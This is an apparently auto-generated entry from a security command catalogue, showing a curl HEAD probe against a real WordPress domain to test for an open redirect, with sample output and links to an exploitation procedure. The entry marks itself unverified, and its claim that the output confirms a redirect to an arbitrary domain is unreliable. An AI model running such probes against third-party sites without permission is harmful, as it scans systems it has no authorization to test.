---
id: cmd-curl-test-malformed-path
data: 'curl -I http://nl.wordpress.net/@google.com'
tags:
  - recon
  - web
  - redirect
type: command
output: 'HTTP/1.1 301 Moved Permanently\nLocation: http://nl.wordpress.org@google.com'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.163Z'
verified: false
validated: true
submitted: true
---
# curl-test-malformed-path

## Command

```bash
curl -I http://nl.wordpress.net/@google.com
```

## Description

This command sends a HEAD request to a malformed path on nl.wordpress.net to test for open redirect vulnerability by inspecting the Location header.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-I` | Perform HEAD request instead of GET to fetch headers only | Yes |
| `http://nl.wordpress.net/@google.com` | Target URL with malformed path to trigger redirect | Yes |

## Examples

### Basic Usage

```bash
curl -I http://nl.wordpress.net/@google.com
```

### Advanced Usage

```bash
curl -I -v http://nl.wordpress.net/@google.com
```

## Expected Output

HTTP/1.1 301 Moved Permanently\nLocation: http://nl.wordpress.org@google.com\n
This confirms the redirect to an arbitrary domain.

## Related

- [[commands/curl-test-subdomain-vector]]
- [[procedures/Exploit-Open-Redirect-via-Malformed-Paths]]
